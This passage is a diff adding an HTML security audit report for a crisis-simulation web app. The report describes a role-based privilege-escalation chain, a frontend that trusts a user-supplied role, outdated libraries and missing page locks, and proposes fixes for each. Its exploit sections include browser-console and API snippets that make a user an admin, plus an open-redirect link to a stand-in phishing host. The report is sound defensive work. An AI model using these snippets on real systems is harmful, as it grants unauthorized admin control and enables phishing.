@@ -1,0 +1,962 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Black Swan Simulations — Frontend Security Audit Report</title>
+    <style>
+      :root {
+        --bg: #0f1115;
+        --panel: #171a21;
+        --panel-2: #1e222b;
+        --ink: #e6e8ec;
+        --ink-soft: #aab1bd;
+        --ink-faint: #7b8494;
+        --line: #2a2f3a;
+        --accent: #ffb800;
+        --accent-2: #6aa3ff;
+        --crit: #ff5470;
+        --high: #ff8a3d;
+        --med: #ffcc4d;
+        --low: #6ad28a;
+        --ok: #59d499;
+        --code-bg: #11141a;
+        --bad: #2a1518;
+        --good: #13241a;
+        --radius: 10px;
+        --mono: ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, monospace;
+        --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      }
+      * { box-sizing: border-box; }
+      html { scroll-behavior: smooth; }
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--ink);
+        font-family: var(--sans);
+        line-height: 1.6;
+        font-size: 16px;
+      }
+      a { color: var(--accent-2); }
+      .layout { display: flex; max-width: 1400px; margin: 0 auto; }
+
+      /* Sidebar */
+      nav.toc {
+        position: sticky;
+        top: 0;
+        align-self: flex-start;
+        height: 100vh;
+        overflow-y: auto;
+        width: 300px;
+        flex: 0 0 300px;
+        padding: 24px 18px;
+        border-right: 1px solid var(--line);
+        background: var(--panel);
+      }
+      nav.toc h2 {
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+        color: var(--ink-faint);
+        margin: 18px 0 8px;
+      }
+      nav.toc a {
+        display: block;
+        color: var(--ink-soft);
+        text-decoration: none;
+        padding: 6px 10px;
+        border-radius: 6px;
+        font-size: 14px;
+      }
+      nav.toc a:hover { background: var(--panel-2); color: var(--ink); }
+      nav.toc .sev-dot {
+        display: inline-block;
+        width: 8px; height: 8px; border-radius: 50%;
+        margin-right: 8px; vertical-align: middle;
+      }
+
+      /* Main */
+      main { flex: 1 1 auto; padding: 40px 48px 120px; min-width: 0; }
+      header.report-head {
+        border-bottom: 1px solid var(--line);
+        padding-bottom: 28px; margin-bottom: 36px;
+      }
+      header.report-head .eyebrow {
+        color: var(--accent); font-size: 13px; letter-spacing: 0.18em;
+        text-transform: uppercase; font-weight: 700;
+      }
+      header.report-head h1 { font-size: 34px; margin: 8px 0 6px; line-height: 1.2; }
+      header.report-head .meta { color: var(--ink-faint); font-size: 14px; }
+
+      h2.section { font-size: 26px; margin: 56px 0 10px; padding-top: 10px; }
+      h3 { font-size: 18px; margin: 28px 0 8px; color: var(--ink); }
+      p { color: var(--ink-soft); }
+      strong { color: var(--ink); }
+
+      /* Severity badges */
+      .badge {
+        display: inline-block; font-size: 11px; font-weight: 800;
+        letter-spacing: 0.08em; text-transform: uppercase;
+        padding: 3px 9px; border-radius: 999px; vertical-align: middle;
+        border: 1px solid transparent;
+      }
+      .b-crit { background: rgba(255,84,112,0.15); color: var(--crit); border-color: var(--crit); }
+      .b-high { background: rgba(255,138,61,0.13); color: var(--high); border-color: var(--high); }
+      .b-med  { background: rgba(255,204,77,0.12); color: var(--med); border-color: var(--med); }
+      .b-low  { background: rgba(106,210,138,0.12); color: var(--low); border-color: var(--low); }
+
+      .finding {
+        background: var(--panel);
+        border: 1px solid var(--line);
+        border-radius: var(--radius);
+        padding: 26px 28px;
+        margin: 22px 0 34px;
+      }
+      .finding > h3:first-child { margin-top: 0; }
+      .finding-title { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+      .finding-title h3 { margin: 0; font-size: 20px; }
+
+      /* Labeled blocks */
+      .block-label {
+        font-size: 12px; font-weight: 800; letter-spacing: 0.1em;
+        text-transform: uppercase; margin: 22px 0 6px;
+        display: flex; align-items: center; gap: 8px;
+      }
+      .block-label .ic { font-size: 15px; }
+      .lbl-plain { color: var(--accent); }
+      .lbl-why { color: var(--high); }
+      .lbl-exploit { color: var(--crit); }
+      .lbl-impact { color: var(--crit); }
+      .lbl-fix { color: var(--ok); }
+      .lbl-after { color: var(--ok); }
+      .lbl-where { color: var(--ink-faint); }
+
+      .plain {
+        background: var(--panel-2);
+        border-left: 4px solid var(--accent);
+        padding: 14px 18px; border-radius: 0 8px 8px 0;
+        color: var(--ink);
+      }
+      .plain p:last-child { margin-bottom: 0; }
+      .plain p:first-child { margin-top: 0; }
+
+      pre {
+        background: var(--code-bg);
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        padding: 14px 16px;
+        overflow-x: auto;
+        font-family: var(--mono);
+        font-size: 13px;
+        line-height: 1.55;
+        color: #d6dae2;
+        margin: 6px 0 4px;
+      }
+      pre.bad { border-color: #5a2230; background: var(--bad); }
+      pre.good { border-color: #25492f; background: var(--good); }
+      code { font-family: var(--mono); font-size: 0.88em; background: var(--panel-2); padding: 1px 5px; border-radius: 4px; color: #f0d49a; }
+      pre code { background: none; padding: 0; color: inherit; }
+      .filename {
+        font-family: var(--mono); font-size: 12px; color: var(--ink-faint);
+        margin: 14px 0 2px;
+      }
+      .filename::before { content: "📄 "; }
+
+      .cmt { color: #6f7888; }
+      .add { color: #7ee2a8; }
+      .del { color: #ff8198; }
+
+      table { border-collapse: collapse; width: 100%; margin: 12px 0; font-size: 14px; }
+      th, td { border: 1px solid var(--line); padding: 9px 12px; text-align: left; vertical-align: top; }
+      th { background: var(--panel-2); color: var(--ink); font-size: 12px; text-transform: uppercase; letter-spacing: 0.06em; }
+      td { color: var(--ink-soft); }
+
+      .callout {
+        border-radius: 8px; padding: 14px 18px; margin: 18px 0;
+        border: 1px solid var(--line); background: var(--panel-2);
+      }
+      .callout.warn { border-color: var(--crit); background: rgba(255,84,112,0.07); }
+      .callout.tip { border-color: var(--ok); background: rgba(89,212,153,0.07); }
+
+      .chain-step {
+        display: flex; gap: 14px; align-items: flex-start;
+        padding: 12px 0; border-bottom: 1px dashed var(--line);
+      }
+      .chain-step:last-child { border-bottom: none; }
+      .chain-num {
+        flex: 0 0 30px; height: 30px; width: 30px; border-radius: 50%;
+        background: var(--crit); color: #1a0006; font-weight: 800;
+        display: flex; align-items: center; justify-content: center; font-size: 15px;
+      }
+      .summary-grid {
+        display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+        gap: 14px; margin: 18px 0;
+      }
+      .stat {
+        background: var(--panel); border: 1px solid var(--line);
+        border-radius: 10px; padding: 16px 18px; text-align: center;
+      }
+      .stat .n { font-size: 30px; font-weight: 800; }
+      .stat .l { font-size: 12px; text-transform: uppercase; letter-spacing: 0.08em; color: var(--ink-faint); }
+      .n.crit { color: var(--crit); } .n.high { color: var(--high); }
+      .n.med { color: var(--med); } .n.low { color: var(--low); }
+
+      footer { border-top: 1px solid var(--line); margin-top: 60px; padding-top: 20px; color: var(--ink-faint); font-size: 13px; }
+      hr.soft { border: none; border-top: 1px solid var(--line); margin: 24px 0; }
+
+      @media (max-width: 900px) {
+        nav.toc { display: none; }
+        main { padding: 24px 18px 80px; }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="layout">
+      <nav class="toc">
+        <div style="font-weight:800;color:var(--accent);letter-spacing:0.06em;">SECURITY AUDIT</div>
+        <div style="font-size:12px;color:var(--ink-faint);margin-top:4px;">Frontend &amp; supporting backend</div>
+
+        <h2>Overview</h2>
+        <a href="#exec">Executive summary</a>
+        <a href="#how-to-read">How to read this report</a>
+
+        <h2>Findings</h2>
+        <a href="#f1"><span class="sev-dot" style="background:var(--crit)"></span>1. Privilege escalation chain</a>
+        <a href="#f2"><span class="sev-dot" style="background:var(--high)"></span>2. Frontend trusts the user's role</a>
+        <a href="#f3"><span class="sev-dot" style="background:var(--high)"></span>3. Vulnerable dependencies</a>
+        <a href="#f4"><span class="sev-dot" style="background:var(--med)"></span>4. No role-based page locks</a>
+        <a href="#f5"><span class="sev-dot" style="background:var(--med)"></span>5. No content security policy</a>
+        <a href="#f6"><span class="sev-dot" style="background:var(--med)"></span>6. Raw HTML injection sinks</a>
+        <a href="#f7"><span class="sev-dot" style="background:var(--low)"></span>7. Hygiene issues</a>
+
+        <h2>Fixing safely</h2>
+        <a href="#breakage">Will the fixes break anything?</a>
+
+        <h2>Reference</h2>
+        <a href="#safe">What was checked &amp; is safe</a>
+        <a href="#glossary">Plain-English glossary</a>
+      </nav>
+
+      <main>
+        <header class="report-head">
+          <div class="eyebrow">Confidential — Internal Security Review</div>
+          <h1>Black Swan Simulations — Security Audit Report</h1>
+          <div class="meta">
+            Scope: <code>frontend/</code> (React + Vite) with supporting analysis of <code>server/</code> and database policies &nbsp;·&nbsp;
+            Date: 16 Jun 2026 &nbsp;·&nbsp; Status: findings only (no code changed yet)
+          </div>
+        </header>
+
+        <!-- ============ EXEC SUMMARY ============ -->
+        <section id="exec">
+          <h2 class="section">Executive summary</h2>
+          <p>
+            This review looked at the web application that trainers and participants use to run crisis
+            simulations. The goal was to find weaknesses an attacker could abuse. We found one
+            <strong>critical</strong> problem that lets any ordinary user secretly promote themselves to the
+            highest level of access ("trainer" or "admin"), plus several other issues ranging from outdated
+            third-party code to missing safety nets.
+          </p>
+
+          <div class="summary-grid">
+            <div class="stat"><div class="n crit">1</div><div class="l">Critical</div></div>
+            <div class="stat"><div class="n high">2</div><div class="l">High</div></div>
+            <div class="stat"><div class="n med">3</div><div class="l">Medium</div></div>
+            <div class="stat"><div class="n low">1</div><div class="l">Low / hygiene</div></div>
+          </div>
+
+          <table>
+            <thead>
+              <tr><th>#</th><th>Finding</th><th>Severity</th><th>One-line risk</th></tr>
+            </thead>
+            <tbody>
+              <tr><td>1</td><td>Privilege-escalation chain</td><td><span class="badge b-crit">Critical</span></td><td>Any user can become admin and control simulations.</td></tr>
+              <tr><td>2</td><td>Frontend trusts the user-supplied role</td><td><span class="badge b-high">High</span></td><td>The app believes whatever role the browser claims.</td></tr>
+              <tr><td>3</td><td>Outdated, vulnerable libraries</td><td><span class="badge b-high">High</span></td><td>Known public exploits (incl. remote code execution).</td></tr>
+              <tr><td>4</td><td>No role-based page locks</td><td><span class="badge b-med">Medium</span></td><td>Debug/trainer pages open to any logged-in user.</td></tr>
+              <tr><td>5</td><td>No Content-Security-Policy</td><td><span class="badge b-med">Medium</span></td><td>No safety net if malicious code is ever injected.</td></tr>
+              <tr><td>6</td><td>Raw HTML injection sinks</td><td><span class="badge b-med">Medium</span></td><td>HTML built from text could become an injection path.</td></tr>
+              <tr><td>7</td><td>Logging / link / API-key hygiene</td><td><span class="badge b-low">Low</span></td><td>Information leakage and minor hardening gaps.</td></tr>
+            </tbody>
+          </table>
+        </section>
+
+        <!-- ============ HOW TO READ ============ -->
+        <section id="how-to-read">
+          <h2 class="section">How to read this report</h2>
+          <p>Each finding is laid out in the same order, so you can stop at whatever depth you need:</p>
+          <table>
+            <tbody>
+              <tr><td><span class="block-label lbl-plain" style="margin:0">In plain English</span></td><td>A non-technical explanation with an everyday analogy.</td></tr>
+              <tr><td><span class="block-label lbl-where" style="margin:0">Where it lives</span></td><td>The exact files and line numbers involved.</td></tr>
+              <tr><td><span class="block-label lbl-why" style="margin:0">Why it's a problem</span></td><td>The security flaw in the code.</td></tr>
+              <tr><td><span class="block-label lbl-exploit" style="margin:0">How it could be exploited</span></td><td>A concrete sample attack.</td></tr>
+              <tr><td><span class="block-label lbl-impact" style="margin:0">Result if exploited</span></td><td>The real-world damage.</td></tr>
+              <tr><td><span class="block-label lbl-fix" style="margin:0">Proposed fix</span></td><td>The recommended code change.</td></tr>
+              <tr><td><span class="block-label lbl-after" style="margin:0">End result after fix</span></td><td>What changes for users and attackers.</td></tr>
+            </tbody>
+          </table>
+        </section>
+
+        <!-- ============ FINDING 1 ============ -->
+        <section id="f1">
+          <h2 class="section">Finding 1 — Privilege-escalation chain</h2>
+          <div class="finding">
+            <div class="finding-title">
+              <h3>Any registered user can promote themselves to "trainer" or "admin"</h3>
+              <span class="badge b-crit">Critical</span>
+            </div>
+
+            <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+            <div class="plain">
+              <p>
+                Think of the app like an office building. A <strong>participant</strong> is a visitor with a basic
+                guest badge. A <strong>trainer/admin</strong> is a manager who can unlock every door, change the
+                schedule, and see confidential files.
+              </p>
+              <p>
+                Right now, the building's badge machine lets <em>visitors print their own manager badge</em>. The
+                security guard at each door (the server) does check the badge — but because the badge says
+                "manager," the guard waves them through. Worse, even after entry, a visitor can walk up to the
+                badge database and rewrite their own badge to "manager" whenever they like.
+              </p>
+            </div>
+
+            <div class="block-label lbl-where"><span class="ic">📍</span> Where it lives</div>
+            <p>This is not a single bug — it is a <strong>chain of four weaknesses</strong> that together form a complete break:</p>
+
+            <div class="chain-step">
+              <div class="chain-num">A</div>
+              <div>
+                <strong>The signup form lets the user pick their own role.</strong>
+                <div class="filename">frontend/src/pages/SignUp.tsx (lines 66–70, and the role dropdown at 282–298)</div>
+<pre class="bad"><code>const { error } = await signUp(email, password, {
+  full_name: fullName,
+  role: role,           <span class="cmt">// &lt;-- chosen by the user, defaults to "trainer"</span>
+  agency_name: agencyName,
+});</code></pre>
+              </div>
+            </div>
+
+            <div class="chain-step">
+              <div class="chain-num">B</div>
+              <div>
+                <strong>The database trigger copies that user-chosen role into the trusted profile table.</strong>
+                <div class="filename">migrations/047_fix_handle_new_user_for_anonymous.sql (lines 27–51)</div>
+<pre class="bad"><code>v_invitation_role := COALESCE(NEW.raw_user_meta_data-&gt;&gt;'role', 'trainer');
+<span class="cmt">-- ...</span>
+  WHEN 'legal_oversight' THEN v_role := 'admin';   <span class="cmt">-- becomes ADMIN</span>
+  ELSE v_role := v_invitation_role;                <span class="cmt">-- "trainer" passes straight through</span>
+<span class="cmt">-- ...</span>
+INSERT INTO public.user_profiles (id, username, full_name, role, agency_name)
+VALUES (NEW.id, ..., v_role, ...);   <span class="cmt">-- the trusted role column is set from user input</span></code></pre>
+                <p style="margin:6px 0 0">And the server reads that exact column to decide what you are allowed to do:</p>
+                <div class="filename">server/middleware/auth.ts (lines 44–56)</div>
+<pre class="bad"><code>if (!userRole) {
+  const { data: profile } = await supabaseAdmin
+    .from('user_profiles')
+    .select('role, agency_name')
+    .eq('id', data.user.id)
+    .single();
+  if (profile) { userRole = profile.role || undefined; }  <span class="cmt">// trusts the column</span>
+}</code></pre>
+              </div>
+            </div>
+
+            <div class="chain-step">
+              <div class="chain-num">C</div>
+              <div>
+                <strong>The database lets a user rewrite their own role at any time (the worst part).</strong>
+                The security rule controls <em>which row</em> you can edit, but not <em>which columns</em>, and it has
+                no <code>WITH CHECK</code> guard.
+                <div class="filename">migrations/002_rls_policies.sql (lines 29–31)</div>
+<pre class="bad"><code>CREATE POLICY "Users can update their own profile"
+  ON user_profiles FOR UPDATE
+  USING (auth.uid() = id);   <span class="cmt">// no column limit, no WITH CHECK -&gt; role is editable</span></code></pre>
+              </div>
+            </div>
+
+            <div class="chain-step">
+              <div class="chain-num">D</div>
+              <div>
+                <strong>A "self-service profile" feature lets a user set their own role — with a guard that does nothing.</strong>
+                The check below is an empty comment; the code then saves whatever role was sent, using a powerful
+                "master key" account that ignores the database safety rules from step C.
+                <div class="filename">server/routes/profile.ts (lines 52–69)</div>
+<pre class="bad"><code><span class="cmt">// "Only allow role updates if user is admin..." -- but the body is EMPTY:</span>
+if (role &amp;&amp; role !== 'admin' &amp;&amp; user.role !== 'admin') {
+  <span class="cmt">// This allows users to set their own role for testing  &lt;-- does nothing</span>
+}
+const updates = {};
+if (role !== undefined) updates.role = role;            <span class="cmt">// accepts 'admin'</span>
+await supabaseAdmin                                      <span class="cmt">// master key -&gt; bypasses step C's lock</span>
+  .from('user_profiles').update(updates).eq('id', user.id);</code></pre>
+                <p style="margin:6px 0 0">
+                  Because this uses the master-key account, fixing the database rule in step C is <em>not enough</em> on its
+                  own — this endpoint has to be fixed too. (The good news: the app's own screens never call it, so fixing
+                  it breaks nothing for users.)
+                </p>
+              </div>
+            </div>
+
+            <div class="callout warn">
+              <strong>Note added after impact analysis:</strong> two facts make this worse. (1) The "official" trusted
+              place for a role (<code>app_metadata</code>) is <em>never set anywhere</em> in the system today, so the role
+              effectively always comes from the user-influenced profile row. (2) There is currently <em>no admin tool</em>
+              to grant someone the trainer role — everyone becomes a trainer simply by signing up. These shape the fix
+              order described in the "Will the fixes break anything?" section below.
+            </div>
+
+            <div class="block-label lbl-why"><span class="ic">⚠️</span> Why it's a problem</div>
+            <p>
+              The application's entire permission system rests on a single value — the user's <em>role</em> — and
+              that value originates from, and can be rewritten by, the very person it is meant to restrict.
+              "Never trust input from the user" is the first rule of security; here the most powerful decision in
+              the system is based directly on user input.
+            </p>
+
+            <div class="block-label lbl-exploit"><span class="ic">💥</span> How it could be exploited</div>
+            <p>Two ways, both trivial. The first needs nothing but the public signup page:</p>
+<pre class="bad"><code><span class="cmt">// Vector A: just choose "TRAINER" in the signup dropdown. Done.</span></code></pre>
+            <p>The second can be run from the browser's developer console by <em>any</em> logged-in user, even one created as a lowly participant:</p>
+<pre class="bad"><code><span class="cmt">// Vector C: paste into the browser console while logged in</span>
+const { data: { user } } = await supabase.auth.getUser();
+await supabase
+  .from('user_profiles')
+  .update({ role: 'admin' })        <span class="cmt">// rewrite my own role</span>
+  .eq('id', user.id);
+<span class="cmt">// Refresh the page -- the server now treats you as an admin.</span></code></pre>
+            <p>Or, even more simply, by asking the server's own profile endpoint to do it:</p>
+<pre class="bad"><code><span class="cmt">// Vector D: one request to the app's own API</span>
+await fetch('/api/profile', {
+  method: 'PATCH',
+  headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
+  body: JSON.stringify({ role: 'admin' }),
+});</code></pre>
+
+            <div class="block-label lbl-impact"><span class="ic">🔥</span> Result if exploited</div>
+            <ul style="color:var(--ink-soft)">
+              <li>Full <strong>trainer/admin</strong> control: create and publish injects, start/stop demos, manage incidents, reassign teams, view hidden "ground truth" intelligence meant only for facilitators.</li>
+              <li>Access to <strong>other organisations' simulations</strong> and participant data they should never see.</li>
+              <li>Ability to <strong>sabotage live exercises</strong> (e.g. injecting fake events) or read confidential scenario material.</li>
+              <li>Because <code>legal_oversight</code> maps to <code>admin</code>, an attacker can reach the very top tier.</li>
+            </ul>
+
+            <div class="block-label lbl-fix"><span class="ic">🛠️</span> Proposed fix</div>
+            <p><strong>Fix C — lock the role column at the database (most important):</strong></p>
+            <div class="filename">new migration, e.g. migrations/188_lock_user_profile_role.sql</div>
+<pre class="good"><code><span class="del">- CREATE POLICY "Users can update their own profile"</span>
+<span class="del">-   ON user_profiles FOR UPDATE USING (auth.uid() = id);</span>
+
+<span class="add">+ -- Users may edit their own row, but NOT their role/agency unless they are already admin.</span>
+<span class="add">+ CREATE OR REPLACE FUNCTION public.prevent_role_self_escalation()</span>
+<span class="add">+ RETURNS TRIGGER AS $$</span>
+<span class="add">+ BEGIN</span>
+<span class="add">+   IF (NEW.role IS DISTINCT FROM OLD.role OR NEW.agency_name IS DISTINCT FROM OLD.agency_name)</span>
+<span class="add">+      AND NOT EXISTS (SELECT 1 FROM user_profiles</span>
+<span class="add">+                      WHERE id = auth.uid() AND role = 'admin') THEN</span>
+<span class="add">+     RAISE EXCEPTION 'Not allowed to change role/agency';</span>
+<span class="add">+   END IF;</span>
+<span class="add">+   RETURN NEW;</span>
+<span class="add">+ END; $$ LANGUAGE plpgsql SECURITY DEFINER;</span>
+<span class="add">+ CREATE TRIGGER trg_prevent_role_self_escalation</span>
+<span class="add">+   BEFORE UPDATE ON user_profiles</span>
+<span class="add">+   FOR EACH ROW EXECUTE FUNCTION public.prevent_role_self_escalation();</span></code></pre>
+
+            <p><strong>Fix B — stop the signup trigger from trusting user input:</strong></p>
+<pre class="good"><code><span class="del">- v_invitation_role := COALESCE(NEW.raw_user_meta_data-&gt;&gt;'role', 'trainer');</span>
+<span class="add">+ -- New self-service accounts are always 'participant'.</span>
+<span class="add">+ -- Elevated roles are granted only by a validated invitation or an admin.</span>
+<span class="add">+ v_role := 'participant';</span></code></pre>
+
+            <p><strong>Fix A — remove the role picker from public signup:</strong></p>
+            <div class="filename">frontend/src/pages/SignUp.tsx</div>
+<pre class="good"><code><span class="cmt">// Delete the [CLEARANCE_LEVEL] &lt;select&gt; (lines ~275-299).</span>
+<span class="cmt">// Trainer/admin roles are assigned later by an admin via the server</span>
+<span class="cmt">// using supabaseAdmin.auth.admin.updateUserById(id, {</span>
+<span class="cmt">//   app_metadata: { role } })  -- a store the user cannot edit.</span></code></pre>
+
+            <p><strong>Fix D — make the profile endpoint refuse self-service role changes:</strong></p>
+            <div class="filename">server/routes/profile.ts</div>
+<pre class="good"><code><span class="del">- if (role !== undefined) updates.role = role;        // anyone could set any role</span>
+<span class="add">+ // Role/agency are NOT self-service. Only an admin may change a role,</span>
+<span class="add">+ // and only through the dedicated admin provisioning endpoint.</span>
+<span class="add">+ if (role !== undefined &amp;&amp; req.user.role !== 'admin') {</span>
+<span class="add">+   return res.status(403).json({ error: 'Not allowed to change role' });</span>
+<span class="add">+ }</span></code></pre>
+
+            <div class="block-label lbl-after"><span class="ic">✅</span> End result after fix</div>
+            <div class="callout tip">
+              New accounts are always ordinary participants. The role lives in a place users cannot write to
+              (server-set <code>app_metadata</code> / a locked column). All four exploits above now fail: the dropdown
+              is gone, the direct database edit is rejected with "Not allowed to change role," and the profile API
+              returns "403 Forbidden." Privileged access can only be granted deliberately by an existing admin.
+            </div>
+          </div>
+        </section>
+
+        <!-- ============ FINDING 2 ============ -->
+        <section id="f2">
+          <h2 class="section">Finding 2 — The frontend trusts the user-supplied role</h2>
+          <div class="finding">
+            <div class="finding-title">
+              <h3>The browser decides what role you are from editable data</h3>
+              <span class="badge b-high">High</span>
+            </div>
+
+            <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+            <div class="plain">
+              <p>
+                Even setting aside Finding 1, the app's screens decide what to show you based on a label that the
+                user's own browser carries around — a label the user can rewrite. It is like a cinema that decides
+                whether to show you the "staff only" room based on a sticker you wrote on your own shirt.
+              </p>
+            </div>
+
+            <div class="block-label lbl-where"><span class="ic">📍</span> Where it lives</div>
+            <div class="filename">frontend/src/contexts/AuthContext.tsx (lines 104–110)</div>
+<pre class="bad"><code>role: (appMetadata.role || metadata.role || defaultRole) as SessionUser['role'],
+<span class="cmt">// metadata.role = user_metadata = freely editable by the user</span></code></pre>
+            <div class="filename">frontend/src/hooks/useRoleVisibility.ts (line 33)</div>
+<pre class="bad"><code>isTrainer: role === 'trainer' || role === 'admin',  <span class="cmt">// gates the UI</span></code></pre>
+
+            <div class="block-label lbl-why"><span class="ic">⚠️</span> Why it's a problem</div>
+            <p>
+              <code>user_metadata</code> can be changed at any time by the user with
+              <code>supabase.auth.updateUser({ data: { role: 'admin' } })</code>. Using it to choose what the
+              interface reveals means trainer-only panels, hints, and "ground truth" can be unlocked purely on the
+              client side, regardless of the server.
+            </p>
+
+            <div class="block-label lbl-exploit"><span class="ic">💥</span> How it could be exploited</div>
+<pre class="bad"><code><span class="cmt">// In the browser console:</span>
+await supabase.auth.updateUser({ data: { role: 'admin' } });
+<span class="cmt">// Reload -- the UI now renders every trainer/admin-only component.</span></code></pre>
+
+            <div class="block-label lbl-impact"><span class="ic">🔥</span> Result if exploited</div>
+            <p>
+              Trainer-only screens render for a participant. On their own, well-protected server endpoints would
+              still reject the data requests — but any information already embedded in those screens, or any
+              endpoint that is <em>not</em> strictly checked, is exposed. Combined with Finding 1 it is a complete
+              takeover.
+            </p>
+
+            <div class="block-label lbl-fix"><span class="ic">🛠️</span> Proposed fix</div>
+            <div class="filename">frontend/src/contexts/AuthContext.tsx</div>
+<pre class="good"><code><span class="del">- role: (appMetadata.role || metadata.role || defaultRole),</span>
+<span class="add">+ // Only trust the server-controlled app_metadata, never user_metadata.</span>
+<span class="add">+ // Better still, fetch the resolved role from a backend /api/auth/me endpoint.</span>
+<span class="add">+ role: (appMetadata.role || defaultRole),</span></code></pre>
+            <p>And always treat the frontend role as a <em>display hint only</em> — the server remains the single source of truth for every action.</p>
+
+            <div class="block-label lbl-after"><span class="ic">✅</span> End result after fix</div>
+            <div class="callout tip">
+              The interface reflects the role the server assigned, which the user cannot rewrite. Editing
+              <code>user_metadata</code> in the console no longer changes what the app displays.
+            </div>
+          </div>
+        </section>
+
+        <!-- ============ FINDING 3 ============ -->
+        <section id="f3">
+          <h2 class="section">Finding 3 — Outdated, vulnerable libraries</h2>
+          <div class="finding">
+            <div class="finding-title">
+              <h3>Third-party packages have publicly known exploits</h3>
+              <span class="badge b-high">High</span>
+            </div>
+
+            <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+            <div class="plain">
+              <p>
+                Modern apps are built on top of free, shared building blocks ("libraries"). Some of the blocks this
+                app uses have known defects that have since been fixed by their authors — but the app is still
+                using the old, broken versions. It is like knowing your front door's lock model was recalled for a
+                flaw, yet leaving it installed.
+              </p>
+            </div>
+
+            <div class="block-label lbl-where"><span class="ic">📍</span> Where it lives</div>
+            <p>An automated scan (<code>npm audit</code>) of <code>frontend/</code> reported <strong>10 vulnerabilities (7 high)</strong>:</p>
+            <table>
+              <thead><tr><th>Package</th><th>Issue</th><th>Severity</th></tr></thead>
+              <tbody>
+                <tr><td><code>react-router-dom</code> 7.9.5</td><td>Remote code execution via bundled <code>turbo-stream</code>; open redirect; XSS; CSRF; denial-of-service</td><td><span class="badge b-high">High</span></td></tr>
+                <tr><td><code>ws</code></td><td>Memory disclosure &amp; denial-of-service</td><td><span class="badge b-high">High</span></td></tr>
+                <tr><td><code>socket.io-parser</code></td><td>Unbounded binary attachments</td><td><span class="badge b-high">High</span></td></tr>
+                <tr><td><code>@babel/core</code> (build only)</td><td>Arbitrary file read</td><td><span class="badge b-high">High</span></td></tr>
+                <tr><td><code>postcss</code> (build only)</td><td>XSS via stringify</td><td><span class="badge b-med">Moderate</span></td></tr>
+              </tbody>
+            </table>
+
+            <div class="block-label lbl-why"><span class="ic">⚠️</span> Why it's a problem</div>
+            <p>
+              These flaws are documented publicly with example exploit code. The <code>react-router-dom</code>
+              advisory is especially serious because it includes a remote-code-execution path and an
+              open-redirect issue (an attacker crafting a link that looks like it goes to your site but bounces
+              the victim to a malicious one).
+            </p>
+
+            <div class="block-label lbl-exploit"><span class="ic">💥</span> How it could be exploited</div>
+<pre class="bad"><code><span class="cmt">// Open-redirect example using the protocol-relative URL flaw:</span>
+https://your-app.example/login?redirect=//evil.example/phish
+<span class="cmt">// The victim trusts the first domain, but lands on the attacker's site.</span></code></pre>
+
+            <div class="block-label lbl-impact"><span class="ic">🔥</span> Result if exploited</div>
+            <p>Depending on the flaw: phishing via trusted-looking links, denial-of-service, leaking server memory, or in the worst case running attacker code on the server.</p>
+
+            <div class="block-label lbl-fix"><span class="ic">🛠️</span> Proposed fix</div>
+            <p>Patch within the current major versions, then smoke-test routing and realtime features:</p>
+<pre class="good"><code><span class="cmt"># in frontend/</span>
+npm audit fix
+npm install react-router-dom@^7.15   <span class="cmt"># patched line</span>
+npm install socket.io-client@latest  <span class="cmt"># pulls fixed ws / socket.io-parser</span>
+npm audit                            <span class="cmt"># confirm 0 high/critical</span></code></pre>
+
+            <div class="block-label lbl-after"><span class="ic">✅</span> End result after fix</div>
+            <div class="callout tip">
+              The scan reports zero high/critical issues, and the known public exploits no longer apply. A
+              recurring <code>npm audit</code> step should be added so this does not silently drift again.
+            </div>
+          </div>
+        </section>
+
+        <!-- ============ FINDING 4 ============ -->
+        <section id="f4">
+          <h2 class="section">Finding 4 — No role-based page locks</h2>
+          <div class="finding">
+            <div class="finding-title">
+              <h3>Debug and trainer pages open to any logged-in user</h3>
+              <span class="badge b-med">Medium</span>
+            </div>
+
+            <div class="block-label lbl-plain"><span class="ic">🟡</span> In plain English</div>
+            <div class="plain">
+              <p>
+                The app checks "are you logged in?" before showing a page, but not "are you allowed on <em>this</em>
+                page?" So internal engineering/debug screens and the trainer dashboard open for anyone with any
+                account — like a building that checks you have a badge at the front door but leaves every internal
+                room unlocked.
+              </p>
+            </div>
+
+            <div class="block-label lbl-where"><span class="ic">📍</span> Where it lives</div>
+            <div class="filename">frontend/src/main.tsx (lines 50–54; routes 131–188)</div>
+<pre class="bad"><code>if (!user) {
+  return &lt;Navigate to="/login" replace /&gt;;
+}
+return &lt;&gt;{children}&lt;/&gt;;   <span class="cmt">// any logged-in user passes -- no role check</span>
+<span class="cmt">// affected: /debug/building-studs, /debug/evacuation-sim,</span>
+<span class="cmt">//           /debug/rts-sim, /sim/:sessionId/trainer</span></code></pre>
+
+            <div class="block-label lbl-why"><span class="ic">⚠️</span> Why it's a problem</div>
+            <p>Debug pages expose internal simulation state and tooling; the trainer dashboard is meant only for facilitators. This is defense-in-depth that complements (does not replace) server checks.</p>
+
+            <div class="block-label lbl-exploit"><span class="ic">💥</span> How it could be exploited</div>
+<pre class="bad"><code><span class="cmt">// A participant simply types the URL:</span>
+https://your-app.example/debug/rts-sim</code></pre>
+
+            <div class="block-label lbl-impact"><span class="ic">🔥</span> Result if exploited</div>
+            <p>Participants see internal/diagnostic tooling and facilitator views, aiding reconnaissance and potentially revealing scenario internals.</p>
+
+            <div class="block-label lbl-fix"><span class="ic">🛠️</span> Proposed fix</div>
+            <div class="filename">frontend/src/main.tsx</div>
+<pre class="good"><code><span class="add">+ const RequireRole = ({ roles, children }) =&gt; {</span>
+<span class="add">+   const { user, loading } = useAuth();</span>
+<span class="add">+   if (loading) return &lt;Loading /&gt;;</span>
+<span class="add">+   if (!user) return &lt;Navigate to="/login" replace /&gt;;</span>
+<span class="add">+   if (!roles.includes(user.role)) return &lt;Navigate to="/dashboard" replace /&gt;;</span>
